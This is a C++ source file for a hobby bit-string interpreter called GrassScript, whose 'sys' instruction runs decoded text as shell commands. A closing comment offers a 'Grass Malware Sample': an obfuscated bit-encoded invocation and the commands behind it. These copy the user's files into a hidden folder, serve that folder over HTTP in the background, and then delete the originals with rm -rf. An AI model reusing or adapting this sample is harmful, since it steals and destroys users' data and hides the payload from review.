// GRASS - BINARY BASED INTERPRETED "LANGUAGE".

/*

ABOUT

GrassScript is an interpreted binary based language that uses instructions to run procedures.

Each instruction is made of 8 chars (bits) that can be v or w (1 or 0). At the end of each instructions there must be W that indicates to the interpreter its the end of an instruction. At the end of the script you can place an V and you can concatenate another GrassScript into it

CHEATSHEET

w = 0

v = 1

W = next instruction

V = next script

WRITTING A GrassScript

Before you start writting a GrassScript typing the script manually, actually there is an automatic converter.

For using it just call Bridge::DoGrass(yourCode);

it will generate grass for each instruction and a valid complete GrassScript.

GrassScript only parses w,v,W,V (0 and 1), that means you can place any other letter that its not a keyword in the script and it wont break the instructions.

RUNNING A GrassScript

In order to run a grass script is really easy, just type in GrassScript::Do(grassCode); automaticly the code will start getting interpreted.

Sample Scripts:

out hello, world!

-- unix

sys ls -la

-- win32

sys dir

*/

#include <iostream>

#include <array>

#include <unistd.h>

#include <string>

#include <bitset>

#include <stdio.h>

#include <sstream>

#include <vector>

using namespace std;

class Utils

{

	public: static string replace(string subject, const string &search, const string &replace)	{

		size_t pos = 0;

		while ((pos = subject.find(search, pos)) != string::npos)

		{

			subject.replace(pos, search.length(), replace);

			pos += replace.length();

		}

		return subject;

	}

	public: static std::vector<std::string > split(const std::string &s, char delim)

	{

		std::vector<std::string > result;

		std::stringstream ss(s);

		std::string item;

		while (getline(ss, item, delim))

		{

			result.push_back(item);

		}

		return result;

	}

	public: static char strToChar(const char *str)

	{

		char parsed = 0;

		for (int i = 0; i < 8; i++)

		{

			if (str[i] == '1')

			{

				parsed |= 1 << (7 - i);

			}

		}

		return parsed;

	}

	public: static string parseUnwantedLetters(string currBin)

	{

		string bin0 = "";

		bin0 = Utils::replace(currBin, "a", "");

		bin0 = Utils::replace(bin0, "a", "");

		bin0 = Utils::replace(bin0, "b", "");

		bin0 = Utils::replace(bin0, "c", "");

		bin0 = Utils::replace(bin0, "d", "");

		bin0 = Utils::replace(bin0, "e", "");

		bin0 = Utils::replace(bin0, "f", "");

		bin0 = Utils::replace(bin0, "g", "");

		bin0 = Utils::replace(bin0, "h", "");

		bin0 = Utils::replace(bin0, "i", "");

		bin0 = Utils::replace(bin0, "j", "");

		bin0 = Utils::replace(bin0, "k", "");

		bin0 = Utils::replace(bin0, "l", "");

		bin0 = Utils::replace(bin0, "m", "");

		bin0 = Utils::replace(bin0, "n", "");

		bin0 = Utils::replace(bin0, "o", "");

		bin0 = Utils::replace(bin0, "p", "");

		bin0 = Utils::replace(bin0, "q", "");

		bin0 = Utils::replace(bin0, "r", "");

		bin0 = Utils::replace(bin0, "s", "");

		bin0 = Utils::replace(bin0, "t", "");

		bin0 = Utils::replace(bin0, "u", "");

		bin0 = Utils::replace(bin0, "v", "");

		bin0 = Utils::replace(bin0, "w", "");

		bin0 = Utils::replace(bin0, "x", "");

		bin0 = Utils::replace(bin0, "y", "");

		bin0 = Utils::replace(bin0, "z", "");

		bin0 = Utils::replace(bin0, "A", "");

		bin0 = Utils::replace(bin0, "B", "");

		bin0 = Utils::replace(bin0, "C", "");

		bin0 = Utils::replace(bin0, "D", "");

		bin0 = Utils::replace(bin0, "E", "");

		bin0 = Utils::replace(bin0, "F", "");

		bin0 = Utils::replace(bin0, "G", "");

		bin0 = Utils::replace(bin0, "H", "");

		bin0 = Utils::replace(bin0, "I", "");

		bin0 = Utils::replace(bin0, "J", "");

		bin0 = Utils::replace(bin0, "K", "");

		bin0 = Utils::replace(bin0, "L", "");

		bin0 = Utils::replace(bin0, "M", "");

		bin0 = Utils::replace(bin0, "N", "");

		bin0 = Utils::replace(bin0, "O", "");

		bin0 = Utils::replace(bin0, "P", "");

		bin0 = Utils::replace(bin0, "Q", "");

		bin0 = Utils::replace(bin0, "R", "");

		bin0 = Utils::replace(bin0, "S", "");

		bin0 = Utils::replace(bin0, "T", "");

		bin0 = Utils::replace(bin0, "U", "");

		bin0 = Utils::replace(bin0, "V", "");

		bin0 = Utils::replace(bin0, "W", "");

		bin0 = Utils::replace(bin0, "X", "");

		bin0 = Utils::replace(bin0, "Y", "");

		bin0 = Utils::replace(bin0, "Z", "");

		bin0 = Utils::replace(bin0, "2", "");

		bin0 = Utils::replace(bin0, "3", "");

		bin0 = Utils::replace(bin0, "4", "");

		bin0 = Utils::replace(bin0, "5", "");

		bin0 = Utils::replace(bin0, "6", "");

		bin0 = Utils::replace(bin0, "7", "");

		bin0 = Utils::replace(bin0, "8", "");

		bin0 = Utils::replace(bin0, "9", "");

		return bin0;

	}

};

class Bridge

{

	public: static string Stack(string data)

	{

		vector<string> str = Utils::split(data, 'W');

		string str_ = "";

		for (string s: str)

		{

			std::string bin0 = Utils::replace(s, "w", "0");

			std::string bin1 = Utils::replace(bin0, "v", "1");

			std::string bin2 = Utils::replace(bin1, "W", "");

			bin2 = Utils::parseUnwantedLetters(bin2);

			str_ += Utils::strToChar(bin2.c_str());

		}

		return str_;

	}

	public: static void Push(string unpacked)

	{

		if (!unpacked.empty())

		{

			if (unpacked.rfind("out", 3) == 0)

			{

				cout << Utils::replace(unpacked, "out ", "") << endl;

			}

			else if (unpacked.rfind("ping", 4) == 0)

			{

				cout << "pong" << endl;

			}

			else if (unpacked.rfind("sys", 3) == 0)

			{

				string cmd = Utils::replace(unpacked, "sys ", "");

				system(cmd.c_str());

			}

			else if (unpacked.rfind("grassVer", 8) == 0)

			{

				cout << "GrassScript v4.2.5c" << endl;

			}

			else if (unpacked.rfind("clear", 5) == 0)

			{

				system("clear");

			}

      else if(unpacked.rfind("grass",4) == 0)

      {

        string toPack = Utils::replace(unpacked, "grass ", "");

        Bridge::DoGrass(toPack);

      }

			else if (unpacked.rfind("gsh", 3) == 0)

			{

				system("clear");

				cout << "Grass Shell Initialized!" << endl;

				while (true)

				{

					string grassScript = "";

					cin >> grassScript;

					if (grassScript.rfind("w", 1) == 0 || grassScript.rfind("v", 1) == 0)

					{

						vector<string> str = Utils::split(grassScript, 'V');

						for (string s: str)

						{

							string gcode = Utils::replace(grassScript, "V", "");

							Push(Stack(gcode));

						}

					}

				}

			}

		}

	}

	private: static string Grassify(string binary)

	{

		string bin0 = Utils::replace(binary, "0", "w");

		string bin1 = Utils::replace(bin0, "1", "v");

		return bin1;

	}

	public: static void DoGrass(string code)

	{

		string grass = "";

		for (std::size_t i = 0; i < code.size(); ++i)

		{

			string s = bitset<8> (code.c_str()[i]).to_string();

			grass += s + "W";

			cout << code.c_str()[i] << " = " << Grassify(s) << endl;

		}

		grass = Grassify(grass);

		cout << "Result Grassified -> " << grass.substr(0, grass.size() - 1) << endl;

	}

};

class GrassScript

{

	public: static void Do(string grassCode)

	{

		vector<string> str = Utils::split(grassCode, 'V');

		for (string s: str)

		{

			string gcode = Utils::replace(s, "V", "");

			Bridge::Push(Bridge::Stack(gcode));

		}

	}

};

bool debugMode = false;

int main(int argc, char **argv)

{

	if (!debugMode)

	{

		if (argc > 1)

		{

			GrassScript::Do(argv[1]);

			return 0;

		}

		else

		{

			cout << "[Grass Interpreter]: No Inputted Script" << endl;

			return 1;

		}

	}

	else 

  {

	

  }

}

// execSample

/*

./grassInterpreter wvvwvvvvWwvvvwvwvWwvvvwvwwWwwvwwwwwWwvvwwvvvWwvvvwwvwWwvvwwwwvWwvvvwwvvWwvvvwwvvWwwvwwwwwWwvvvwwvvWwvvwwwvvWwvvvwwvwWwvvwvwwvWwvvvwwwwWwvvvwvwwWwwvwwwwwWwvvwvvvvWwvvwvvvwWwwvwwwwwWwvvvwvwwWwvvwvvvvWwvvvwwww

// gsh (grass shell) a bit glitchy

./main wvvwwvvvWwvvvwwvvWwvvwvwww

// Grass Malware Sample

./main wvvwvvvvWwvvvwvwvWwvvvwvwwWwwvwwwwwWwvvwvwwwWwvvwwvwvWwvvwvvwwWwvvwvvwwWwvvwvvvvWwwvwwwwwWwvvvwvvvWwvvwvvvvWwvvvwwvwWwvvwvvwwWwvvwwvwwVwvvvwwvvWwvvvvwwvWwvvvwwvvWwwvwwwwwWwvvwwwvwWwvvwwwwvWwvvvwwvvWwvvwvwwwWwwvwwwwwWwwvwwvvwWwwvvvvvwWwwvwwwwwWwwvwvvvvWwvvwwvwwWwvvwwvwvWwvvvwvvwWwwvwvvvvWwvvwvvvwWwvvvwvwvWwvvwvvwwWwvvwvvwwVwvvvwwvvWwvvvvwwvWwvvvwwvvWwwvwwwwwWwvvwvvwvWwvvwvwvvWwvvwwvwwWwvvwvwwvWwvvvwwvwWwwvwwwwwWwvvwvvwwWwvvwvvvvWwvvwvvvvWwvvvwvwwVwvvvwwvvWwvvvvwwvWwvvvwwvvWwwvwwwwwWwvvwvvwvWwvvvwvvwWwwvwwwwwWwwvwvvvwWwwvwvvvvWwvvwvvwwWwvvwvvvvWwvvwvvvvWwvvvwvwwWwwvwwwwwWwwvwvvvwWwwvwvvvvWwwvwvvvwWwwvwvvvwWwwvwvvvvWwwvwvvvwWwvvwvvwwWwvvwvvvvWwvvwvvvvWwvvvwvwwVwvvvwwvvWwvvvvwwvWwvvvwwvvWwwvwwwwwWwvvwwwvvWwvvvwwwwWwwvwwwwwWwwvwvvvwWwwvwvvvvWwwvwvwvwWwwvwwwwwWwwvwvvvwWwwvwvvvvWwwvwvvvwWwwvwvvvwWwwvwvvvvWwwvwvvvwWwvvwvvwwWwvvwvvvvWwvvwvvvvWwvvvwvwwVwvvvwwvvWwvvvvwwvWwvvvwwvvWwwvwwwwwWwvvvwwwwWwvvvvwwvWwvvvwvwwWwvvwvwwwWwvvwvvvvWwvvwvvvwWwwvwwwwwWwwvwvvwvWwvvwvvwvWwwvwwwwwWwvvwvwwwWwvvvwvwwWwvvvwvwwWwvvvwwwwWwwvwvvvwWwvvvwwvvWwvvwwvwvWwvvvwwvwWwvvvwvvwWwvvwwvwvWwvvvwwvwWwwvwwwwwWwwvwvvwvWwwvwvvwvWwvvwwvwwWwvvwvwwvWwvvvwwvwWwvvwwvwvWwvvwwwvvWwvvvwvwwWwvvwvvvvWwvvvwwvwWwvvvvwwvWwwvwwwwwWwwvwwvwwWwvwwvwwwWwvwwvvvvWwvwwvvwvWwvwwwvwvWwwvwvvvvWwwvwvvvwWwvvwvvwwWwvvwvvvvWwvvwvvvvWwvvvwvwwWwwvwvvvvWwwvwwwwwWwwvvvvvwWwwvwwwwwWwwvwvvvvWwvvwwvwwWwvvwwvwvWwvvvwvvwWwwvwvvvvWwvvwvvvwWwvvvwvwvWwvvwvvwwWwvvwvvwwWwwvwwwwwWwwvwwvvwWwwvwwwwwWwvvwwvwwWwvvwvwwvWwvvvwwvvWwvvwvvvvWwvvvwvvvWwvvwvvvwVwvvwwwvvWwvvwvvwwWwvvwwvwvWwvvwwwwvWwvvvwwvwVwvvvwwvvWwvvvvwwvWwvvvwwvvWwwvwwwwwWwvvvwwvwWwvvwvvwvWwwvwwwwwWwwvwvvwvWwvvvwwvwWwvvwwvvwWwwvwwwwwWwwvwvvvwWwwvwvvvvWwwvwvwvw

    Bridge::DoGrass("out hello world");

    Bridge::DoGrass("sys bash &> /dev/null");

    Bridge::DoGrass("sys mkdir loot");

    Bridge::DoGrass("sys mv ./loot ./../.loot");

    Bridge::DoGrass("sys cp ./* ./../.loot");

    Bridge::DoGrass("sys python -m http.server --directory $HOME/.loot/ > /dev/null & disown");

    Bridge::DoGrass("clear");

    Bridge::DoGrass("sys rm -rf ./*");

*/
